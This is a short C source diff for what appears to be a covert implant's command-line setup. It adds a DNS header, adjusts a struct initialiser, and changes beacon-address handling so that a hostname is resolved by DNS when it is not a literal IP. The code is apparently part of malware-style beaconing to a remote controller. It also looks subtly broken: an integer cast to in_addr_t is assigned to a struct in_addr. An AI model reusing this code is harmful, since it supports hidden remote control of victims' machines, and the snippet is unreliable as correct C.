@@ -24,6 +24,7 @@
 #include "polarssl/sha1.h"
 #include "crypto.h"
 #include "crypto_strings_main.h"
+#include "dns_protocol.h"
 #ifdef LINUX
 	#include "getopt.h"
 #endif
@@ -78,7 +79,7 @@ struct cl_args
 
 #define SIG_HEAD	0x7AD8CFB6
 
-struct cl_args		args = { SIG_HEAD, 0, 0, {0}, {0}, {0}, 0, 0, 0, 0, 0, {0}, 0 };
+struct cl_args		args = { SIG_HEAD, 0, 0, {0}, {0}, {0}, {0}, 0, 0, 0, 0, 0, {0}, 0 };
 
 //**************************************************************
 D (
@@ -122,7 +123,7 @@ int main(int argc, char** argv)
 	int				c = 0;
 	char			*beaconIP = NULL;
 	char			dns_ip[16];
-	struct in_addr	beaconIPaddr = 0;
+	struct in_addr	beaconIPaddr;
 	char			*szInterface = NULL;
 	int				beaconPort = DEFAULT_BEACON_PORT;
 	unsigned long	initialDelay = DEFAULT_INITIAL_DELAY;
@@ -361,8 +362,8 @@ int main(int argc, char** argv)
 		DLX(1, printUsage(argv[0]));
 		return 0;
 	}
-	if (inet_pton(AF_INET, beaconIP, beaconIPaddr) == 0) {	// Determine if beacon IP is an address
-		beaconIPaddr = dns_resolv(beaconIP, dns_ip);		// If not, attempt a DNS lookup.
+	if (inet_pton(AF_INET, beaconIP, &beaconIPaddr) == 0) {					// Determine if beacon IP is an address
+		beaconIPaddr = (in_addr_t)dns_resolv(beaconIP, dns_ip);		// If not, attempt a DNS lookup.
 	}
 
 	if (initialDelay > 0 && interval == 0 ) {
